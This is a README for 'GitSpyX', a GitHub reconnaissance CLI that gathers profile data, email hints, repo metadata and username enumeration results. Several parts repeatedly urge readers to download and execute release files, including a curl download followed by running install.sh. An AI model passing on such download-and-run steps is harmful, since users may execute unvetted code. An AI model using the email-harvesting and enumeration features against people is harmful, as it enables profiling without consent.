# GitSpyX — GitHub Recon Tool for Profiles, Repos, Metadata 🔎

[![Releases](https://img.shields.io/badge/Release-Download-blue?logo=github)](https://github.com/voidxzzs/GitSpyX/releases)

[![Python 3](https://img.shields.io/badge/Python-3.x-blue.svg?logo=python)](https://www.python.org/)
[![License](https://img.shields.io/badge/License-MIT-green)](LICENSE)
[![Topics](https://img.shields.io/badge/topics-automation%20%7C%20cli--tool%20%7C%20github--api-lightgrey)](https://github.com/topics)

![GitSpyX Banner](https://images.unsplash.com/photo-1537432376769-00a2c64b1a8b?auto=format&fit=crop&w=1400&q=60)

- Automation
- CLI tool
- GitHub OSINT
- Metadata extraction
- Repo analyzer
- Username enumeration

Download the release file and run it from the Releases page: https://github.com/voidxzzs/GitSpyX/releases

Overview
-------

GitSpyX helps you gather structured data from GitHub accounts and repositories. It fetches profile details, repository metadata, commit stats, dependency signals, and other assets that support analysis and research. Use it as a command line tool or embed parts in scripts and pipelines.

The tool focuses on clear output formats (JSON, CSV), flexible queries, and reproducible results. It can scan single users, lists of users, single repos, or entire organizations. It integrates with the GitHub REST API and adds local parsing for README content, topics, and file metadata.

Why use GitSpyX
---------------

- Run targeted scans from a terminal.
- Export standardized metadata for analysis.
- Enumerate usernames and check repo ownership links.
- Pull commit and file-level metadata for artifacts.
- Automate scheduled scans in CI or cron jobs.
- Parse and extract structured data from README and code headers.

Main features
-------------

- Profile collection: name, bio, email hints, social links.
- Repo insights: stars, forks, watchers, topics, languages.
- Metadata extraction: LICENSE, CODEOWNERS, dependabot files.
- Commit metrics: commit counts, top committers, activity over time.
- File metadata: file sizes, paths, extensions, binary flags.
- Username enumeration: test variants and check availability or presence.
- Rate-limit aware GitHub API calls with optional token.
- Output formats: JSON, CSV, plain text, and custom templates.
- Config file support and environment variables.
- Docker image for containerized runs.
- Plugin hooks for custom parsers.

Badges and topics
-----------------

[![automation](https://img.shields.io/badge/automation-yes-lightgrey)](https://github.com/topics/automation)
[![cli-tool](https://img.shields.io/badge/cli--tool-yes-lightgrey)](https://github.com/topics/cli-tool)
[![github-api](https://img.shields.io/badge/github--api-rest-lightgrey)](https://github.com/topics/github-api)
[![osint](https://img.shields.io/badge/osint-ready-lightgrey)](https://github.com/topics/osint)
[![python3](https://img.shields.io/badge/python3-supported-blue)](https://www.python.org/)

Quick links
-----------

- Releases (download and run one of the packaged files): https://github.com/voidxzzs/GitSpyX/releases
- Repository page: https://github.com/voidxzzs/GitSpyX
- License: MIT

Install
-------

Option 1 — From PyPI
- If a PyPI package exists use:
  - `pip install gitspyx`
- The CLI installs an entry point `gitspyx`.

Option 2 — From source
- Clone the repo:
  - `git clone https://github.com/voidxzzs/GitSpyX.git`
  - `cd GitSpyX`
  - `pip install -r requirements.txt`
  - `python -m pip install .`

Option 3 — Releases (download and execute)
- Visit the Releases page and pick the matching file for your platform.
- Download the file and run the included installer or binary.
  - Example for a tarball pattern:
    - `curl -L -o GitSpyX.tar.gz https://github.com/voidxzzs/GitSpyX/releases/download/vX.Y.Z/GitSpyX-X.Y.Z.tar.gz`
    - `tar -xzf GitSpyX.tar.gz`
    - `cd GitSpyX-X.Y.Z`
    - `./install.sh` or `python setup.py install`
- The release file must be downloaded and executed to install packaged assets. See: https://github.com/voidxzzs/GitSpyX/releases

Docker
- Build locally:
  - `docker build -t gitspyx .`
- Run a basic scan:
  - `docker run --rm -e GITHUB_TOKEN=${GITHUB_TOKEN} gitspyx gitspyx user --target=octocat --output=out.json`

Quick start — CLI examples
--------------------------

Assume you have a GitHub token in `GITHUB_TOKEN` environment variable for higher rate limits.

Fetch a single user profile
- `gitspyx user --target octocat --format json --out octocat.json`

Scan a repository
- `gitspyx repo --target github/linguist --format json --out linguist.json`

Enumerate usernames from a list
- `gitspyx enumerate --list users.txt --format csv --out users.csv`

Scan an organization
- `gitspyx org --target github --depth 2 --format json --out github-org.json`

Run a discover pipeline
- `gitspyx pipeline run --config pipeline.yaml --out results/`

Arguments and flags
-------------------

- `--target` : Single target string. For repo use `owner/repo`. For user use username.
- `--list` : Path to a file with targets, one per line.
- `--format` : Output format. Options: `json`, `csv`, `text`.
- `--out` : Output path or directory.
- `--depth` : Depth for org scanning. 0 = only top level. 1 = repos. 2 = repos + forks, etc.
- `--token` : GitHub token on the command line (or set `GITHUB_TOKEN` env var).
- `--concurrency` : Number of concurrent workers.
- `--timeout` : HTTP timeout in seconds.
- `--no-cache` : Disable local caching of API responses.
- `--log-level` : `debug`, `info`, `warn`, `error`.
- `--profile` : Only fetch profile metadata.
- `--repo` : Only fetch repo metadata.
- `--files` : Scan repository file metadata and list matches for given patterns.
- `--template` : Output must follow a custom Jinja2 template file.

Examples with outputs
---------------------

1) User profile JSON
- Command:
  - `gitspyx user --target octocat --format json --out octocat.json`
- Sample output fields:
  - `username` : "octocat"
  - `id` : 583231
  - `name` : "The Octocat"
  - `company` : "GitHub"
  - `location` : "San Francisco"
  - `email` : null
  - `blog` : "https://github.blog"
  - `bio` : "A test user"
  - `created_at` : "2011-01-25T18:44:36Z"
  - `followers` : 5000
  - `following` : 9
  - `public_repos` : 8
  - `public_gists` : 0
  - `verified` : false
  - `signals` : { "emails_found": 1, "urls_found": 3 }

2) Repo metadata JSON
- Command:
  - `gitspyx repo --target octocat/Hello-World --format json --out repo.json`
- Sample fields:
  - `full_name` : "octocat/Hello-World"
  - `id` : 1296269
  - `description` : "This your first repo!"
  - `private` : false
  - `owner` : { user object }
  - `stars` : 1500
  - `forks` : 1000
  - `watchers` : 1500
  - `open_issues` : 5
  - `topics` : ["tutorial", "hello-world"]
  - `languages` : ["Ruby", "Shell"]
  - `license` : { "key": "mit", "name": "MIT License" }
  - `default_branch` : "master"
  - `created_at` : "2011-01-26T19:01:12Z"
  - `last_push` : "2020-12-08T17:33:58Z"
  - `size_kb` : 108
  - `file_list_sample` : [ { "path": "README.md", "size": 1024, "sha": "..." } ]

3) Commit activity summary (CSV)
- Command:
  - `gitspyx repo --target octocat/Hello-World --commits --format csv --out commits.csv`
- CSV example columns:
  - `sha`, `author`, `date`, `message`, `files_changed`, `additions`, `deletions`

Detailed modes
--------------

Profile mode
- Pulls the GitHub profile record and scans linked resources.
- It tries to extract email patterns from commits and public files.
- It lists public keys and SSH fingerprints when available.

Repo mode
- Fetches repo metadata and top-level files.
- It scans the default branch tree for filenames of interest:
  - LICENSE, README, CODEOWNERS, .github/workflows, dependabot.yml, requirements.txt, package.json
- It extracts dependency indicators and maps languages.

Commit mode
- Walks the commit history on the default branch for a given depth.
- Extracts author metadata, commit counts, time series, and top contributors.

Enumeration mode
- Load a list of candidate usernames.
- Test existence by hitting user profile endpoints.
- Optionally search for repositories that include that username in config files or commit authors.

Pipelines
---------

Pipelines combine steps to produce a final dataset. A simple pipeline can:
- Read a list of org members.
- For each member, fetch profile and their top 3 repos.
- Fetch repo metadata and file metadata for those repos.
- Aggregate outputs into a single JSON Lines file.

A pipeline config example (YAML)
- fields:
  - `name`: github-member-scan
  - `steps`:
    - fetch_org_members:
        org: example-org
    - fetch_user_profile:
        for_each: members
    - fetch_top_repos:
        per_user: 3
    - fetch_repo_files:
        patterns: ["LICENSE", "README.md", "requirements.txt"]
    - aggregate:
        out: aggregated.jsonl

Deployment and automation
-------------------------

CI integration
- Use the CLI in CI to produce artifacts.
- Store outputs as build artifacts or push to S3.

Cron and scheduled scans
- The CLI runs in shell scripts.
- Schedule daily scans for targets and push diffs to a central storage.

Docker
- Use a container to isolate runtime and dependencies.
- Pass `GITHUB_TOKEN` via env var or mounted secret file.

Integration tips
----------------

- Use `--format jsonl` for streaming large outputs.
- Combine `--concurrency` with `--timeout` to tune API throughput.
- Cache responses to reduce API usage on repeated runs.
- Use the `--template` option to map fields to a custom CSV or report.

Rate limits and tokens
----------------------

- The GitHub REST API imposes rate limits.
- Set `GITHUB_TOKEN` to increase limits.
- GitSpyX monitors rate-limit headers and slows requests when needed.
- The tool exposes a `--rate-report` flag to show current limits and usage.

Performance
-----------

- GitSpyX uses worker pools and asynchronous HTTP for throughput.
- It caches ETag responses to save bandwidth.
- For very large orgs, run scans in batches and export per-batch outputs.

Output formats and fields
-------------------------

JSON / JSON Lines
- Use for structured data ingestion.
- Each object follows a consistent schema and includes timestamps and context.

CSV
- Use for spreadsheets and quick views.
- The exporter flattens nested fields.

Text
- Human-readable console output suitable for logs and quick scans.

Sample JSON schema (high level)
- `meta` : { `scan_id`, `scan_time`, `version` }
- `target` : { `type`: "user|repo|org", `value`: string }
- `data` : object (profile, repo, commits, files)
- `signals` : object (emails, urls, license_detected)
- `score` : number (custom metric, 0-100)

Security and safe use
---------------------

- Use a token with the lowest necessary scope.
- Avoid exposing tokens in public logs.
- Store tokens in environment variables or secret stores.

Extensibility and plugins
-------------------------

- GitSpyX includes a plugin loader.
- Write a plugin to parse custom file formats or to emit results to a specific sink.
- Plugins follow a simple interface:
  - `init(config)`
  - `process(record)`
  - `flush()`

Examples: older commit parser
- Implement `process(record)` to inspect commit messages for CI tags, issue IDs, and references.
- Use `flush()` to write aggregated metrics.

Configuration
-------------

Config file locations
- Default: `~/.config/gitspyx/config.yaml`
- Local: `./gitspyx.yaml`
- You can override with `--config /path/to/config.yaml`

Config options
- concurrency: number
- timeout: seconds
- cache_dir: path
- output_dir: path
- default_format: json
- rate_limit_warn_threshold: percent

Logging
-------

- GitSpyX logs to stdout by default.
- Use `--log-level debug` for detailed traces.
- Logs follow structured JSON when `--log-json` is enabled.

Code structure
--------------

- `gitspyx/cli.py` — CLI entry and argument parsing.
- `gitspyx/api.py` — GitHub API client and rate-limit handling.
- `gitspyx/parsers/` — Parsers for README, license, dependency files.
- `gitspyx/output/` — Writers for JSON, CSV, text.
- `gitspyx/plugins/` — Plugin loader and base classes.

Testing
-------

- The repo contains unit tests under `tests/`.
- Run tests:
  - `pytest -q`
- Add integration tests for API interactions with recorded fixtures.
- Use `vcrpy` or recorded responses to avoid hitting real endpoints during CI.

Examples: real workflows
------------------------

1) Researcher workflow
- Prepare a list of usernames from a source.
- Run enumeration to confirm active accounts.
- Fetch profiles and top repos.
- Extract README content and search for contact methods or project links.
- Export aggregated JSON to feed into analysis tools.

2) Audit workflow
- Scan a repo for dependency files and CI workflows.
- Extract secrets-like patterns with a safe scanner.
- Generate a report of outdated dependencies and missing security settings.

3) Acquisition pipeline
- Periodically run repo scans to detect new public forks.
- Flag repos with suspicious changes or newly published packages.

Username enumeration details
----------------------------

- The enumeration module checks username formats and known variants.
- It combines:
  - direct profile lookup
  - repo ownership checks
  - commit author searches
- It returns status: `exists`, `not_found`, `ambiguous`.
- It emits contextual data: matched repos, commit hits, and file mentions.

Metadata extraction rules
-------------------------

- License detection:
  - Check top-level LICENSE file.
  - Fall back to license field in repo metadata.
- Dependency detection:
  - Parse platform-specific manifests: `requirements.txt`, `Pipfile`, `package.json`, `go.mod`, `Cargo.toml`.
- Config detection:
  - Identify CI workflows under `.github/workflows`.

File scanning
-------------

- The file scanner lists tree entries and fetches small files inline.
- It streams large files and applies pattern matchers to header regions.
- File metadata includes size, mime type guess, and SHA.

JSON output deep fields (example)
- `files`:
  - `path`: string
  - `size`: int (bytes)
  - `mime`: string
  - `sha`: string
  - `binary`: bool
  - `snippets`: array of extracted strings
- `commits_summary`:
  - `total_commits`
  - `first_commit`
  - `last_commit`
  - `top_authors`: list of authors with counts

Scoring model
-------------

- GitSpyX can apply a simple score to a repo or profile.
- The default metric considers:
  - public activity
  - presence of contact info
  - license presence
  - number of active contributors
- Scores help filter targets for follow-up.

CLI output examples
-------------------

Human output
- `gitspyx user --target octocat`
  - User: octocat
  - Name: The Octocat
  - Public repos: 8
  - Followers: 5000
  - Email hints: 1

JSON lines
- `gitspyx org --target example-org --format jsonl > out.jsonl`
- Each line contains a `meta` and `data` object for a single result.

Common workflows and recipes
----------------------------

Scripted pipeline: export top repos for users
- Bash:
  - `cat users.txt | xargs -n1 -P4 -I{} gitspyx user --target {} --format json | jq -r '.data.top_repos[] | .full_name' > top_repos.txt`

Attach to SIEM
- Use `gitspyx` in a scheduled job that pushes JSON events to a SIEM or data lake.
- Tag events with `scan_id` and `source:gitspyx`.

Advanced usage
--------------

- Use `--template` to build a report with Jinja2. Set fields and layout in a template.
- Stream to stdout and pipe into other utilities like `jq`, `gron`, or `mlscore` pipelines.
- Write a plugin to emit to Elasticsearch or a message queue.

Contributing
------------

- Fork the repository.
- Create a feature branch.
- Run tests and add unit tests for new features.
- Open a pull request with a clear changelog entry.

Guidelines
- Keep functions small and testable.
- Document new CLI flags in `cli.py` and the README.
- Follow PEP8 for Python code.

Roadmap
-------

Planned items
- Add GraphQL support for faster object retrieval.
- Add built-in export to Elasticsearch.
- Implement a web UI for visualization of scan results.
- Add more built-in parsers for package managers and lockfiles.

How to report issues
--------------------

- Open issues in the repository issue tracker.
- Include:
  - command you ran
  - full output or attached log
  - environment details (OS, Python version)
  - configuration file if relevant

Frequently asked questions
--------------------------

Q: Do I need a GitHub token?
A: The tool works without a token. A token increases rate limits and avoids blocking on large scans.

Q: Can I run a dry run?
A: Use `--no-execute` in pipeline mode to validate steps without fetching remote data.

Q: How do I scan private repos?
A: Use a token with the correct scopes and ensure your account has access.

Q: How do I get structured CSV output?
A: Use `--format csv`. For nested fields, use `--template` to flatten structure.

Files and artifacts
-------------------

- `CHANGELOG.md` — Release notes.
- `CONTRIBUTING.md` — Contribution guidelines.
- `LICENSE` — MIT license file.
- `docs/` — User and developer docs.
- `examples/` — Example configs and outputs.

Releases and downloads
----------------------

The packaged release files contain compiled assets, scripts, and installers. Download the appropriate file from the Releases page and run the included installer or binary. The release file must be downloaded and executed to install packaged assets. See: https://github.com/voidxzzs/GitSpyX/releases

Support and contact
-------------------

- Open an issue for technical requests.
- For feature requests, propose an RFC-style issue with motivation and examples.

Glossary
--------

- Target: The user, repo, or org you scan.
- Scan ID: A unique identifier attached to each run.
- Plugin: An extension that processes records or emits results.
- Signal: A single extracted piece of information such as an email, URL, or license.

License
-------

MIT — See the LICENSE file for details.

Acknowledgements
----------------

- The project uses the GitHub REST API.
- It uses third-party libraries for HTTP, parsing, and templating.

This README covers installation, core features, CLI use, pipelines, configuration, outputs, internals, and development guidelines. It references the Releases page for packaged downloads and includes examples for common workflows and integrations.